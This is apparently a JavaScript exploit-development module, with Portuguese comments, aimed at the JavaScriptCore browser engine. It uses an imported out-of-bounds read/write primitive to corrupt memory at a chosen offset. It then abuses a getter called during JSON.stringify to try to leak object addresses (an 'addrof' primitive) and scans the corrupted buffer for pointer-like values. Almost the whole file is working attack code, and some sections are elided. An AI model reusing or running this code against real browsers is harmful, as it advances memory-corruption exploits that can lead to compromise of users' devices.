// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierOverflow";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    leaked_pointers_in_oob_ab: [] // Armazenará {offset, value_hex}
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xFEFEFEFE; // Padrão distinto para o oob_ab
const OOB_AB_SNOOP_SIZE = 0x800; // Sondar os primeiros 2KB do oob_array_buffer_real

// Objeto global para tentar vazar o endereço
let object_to_leak_address_ref; 

class CheckpointForStringifierOverflow {
    constructor(id) {
        this.id_marker = `StrOverflowChkpt-${id}`;
        this.checkpoint_data = "Initial Checkpoint Data";
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierOverflow_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Reset
            success: false, message: "Getter chamado, tentando forçar overflow do Stringifier.",
            error: null, leaked_pointers_in_oob_ab: [], details: ""
        };
        let details_log = [];
        let leak_found_in_oob_ab = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB ou oob_ab não disponíveis no getter.");
            }

            // 1. Preencher o oob_array_buffer_real com um padrão
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            logS3(`DENTRO DO GETTER: Preenchendo oob_ab de 0 a ${toHex(fill_limit)} com ${toHex(OOB_AB_FILL_PATTERN_U32)}...`, "info", FNAME_GETTER);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_ab preenchido com padrão.`);

            // 2. Criar objeto de stress que contém a referência ao objeto cujo endereço queremos vazar
            // object_to_leak_address_ref já foi definido no runner.
            if (!object_to_leak_address_ref) {
                details_log.push("ERRO: object_to_leak_address_ref não está definido globalmente!");
                throw new Error("Objeto alvo global para leak não definido.");
            }

            let stress_obj_for_internal_stringify = {
                id_str: "ObjectToForceStringifierOverflow",
                data_payload_A: "STRING_PAYLOAD_A_" + "X".repeat(256) + "_END_A", // String longa
                target_object_reference: object_to_leak_address_ref, // O objeto que queremos vazar
                numeric_values: [0x11111111, 0x22222222, 0x33333333, Date.now()],
                data_payload_B: "STRING_PAYLOAD_B_" + "Y".repeat(256) + "_END_B", // Outra string longa
                nested: {
                    target_again: object_to_leak_address_ref,
                    deep_string: "DEEP_STRING_" + "Z".repeat(128)
                }
            };
            details_log.push(`Objeto de stress (contendo object_to_leak_address_ref ID: ${object_to_leak_address_ref.unique_id_val}) criado.`);

            // 3. Chamar JSON.stringify internamente para fazer o Stringifier (corrompido) trabalhar
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_output_string = "";
            try {
                internal_json_output_string = JSON.stringify(stress_obj_for_internal_stringify);
                details_log.push(`Stringify interno completado. Output length: ${internal_json_output_string.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_json_output_string.length}`, "info", FNAME_GETTER);
            } catch (e_json_int) {
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                current_test_results.error = (current_test_results.error || "") + ` ErrStrfyInt: ${e_json_int.message}`;
            }

            // 4. Sondar o oob_array_buffer_real por alterações no padrão / ponteiros vazados
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas/vazamentos do Stringifier...", "info", FNAME_GETTER);
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) { // Passo de 4, mas analisa como 8
                let skip_current_offset = false;
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) {
                    skip_current_offset = true; 
                     try {
                        const val_trig_u32 = oob_read_absolute(offset, 4);
                        if (val_trig_u32 !== OOB_AB_FILL_PATTERN_U32) {
                             current_test_results.leaked_pointers_in_oob_ab.push({offset: toHex(offset), value: `TriggerArea: ${toHex(val_trig_u32)}`, note: "Trigger"});
                        }
                     } catch(e){}
                }
                if(skip_current_offset) continue;

                try {
                    const dword_val = oob_read_absolute(offset, 4);
                    if (dword_val !== OOB_AB_FILL_PATTERN_U32) {
                        const qword_context_val = oob_read_absolute(offset, 8); // Ler o QWORD completo
                        const leak_info = `oob_data[${toHex(offset)}] alterado! DWORD=${toHex(dword_val)}, QWORD_CTX=${qword_context_val.toString(true)} (Padrão DWORD: ${toHex(OOB_AB_FILL_PATTERN_U32)})`;
                        logS3(leak_info, "leak", FNAME_GETTER);
                        current_test_results.leaked_pointers_in_oob_ab.push({offset: toHex(offset), value_hex: qword_context_val.toString(true), note: "Data Overwritten"});
                        leak_found_in_oob_ab = true;
                        
                        // Heurística para ponteiro JS (ajuste os limites high_min/high_max conforme necessário)
                        const high_part = qword_context_val.high();
                        if (high_part > 0x1000 && high_part < 0x80000000 && !(qword_context_val.low() === 0xFFFFFFFF && high_part === 0xFFFFFFFF)) {
                            logS3(`  -> VALOR ALTAMENTE SUSPEITO DE PONTEIRO! ${qword_context_val.toString(true)}`, "vuln", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop) {}
            }

            if (leak_found_in_oob_ab) {
                current_test_results.success = true;
                current_test_results.message = `VAZAMENTO POTENCIAL! Encontradas ${current_test_results.leaked_pointers_in_oob_ab.length} alterações/escritas no oob_array_buffer_real.`;
            } else {
                current_test_results.message = "Nenhuma alteração/vazamento detectado no oob_array_buffer_real após stringify interno.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_stringifier_overflow_exploit": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierOverflow.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_overflow_exploit_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierOverflowTestRunner";
    logS3(`--- Iniciando Teste de Overflow do Stringifier para AddrOf ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };
    object_to_leak_address_ref = null; // Resetar global

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Criar o objeto alvo global ANTES do gatilho
        object_to_leak_address_ref = { "unique_id_val": 0xABCDE000 + Math.floor(Math.random()*0xFFF) };
        logS3(`Objeto alvo global para addrof criado: ID=${toHex(object_to_leak_address_ref.unique_id_val)}`, "info", FNAME_TEST_RUNNER);

        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierOverflow(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE OVERFLOW STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE OVERFLOW STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaked_pointers_in_oob_ab && current_test_results.leaked_pointers_in_oob_ab.length > 0) {
            logS3("--- Dados Alterados/Ponteiros Vazados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaked_pointers_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value_hex || item.value} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    object_to_leak_address_ref = null;
    logS3(`--- Teste de Overflow do Stringifier para AddrOf Concluído ---`, "test", FNAME_TEST_RUNNER);
}
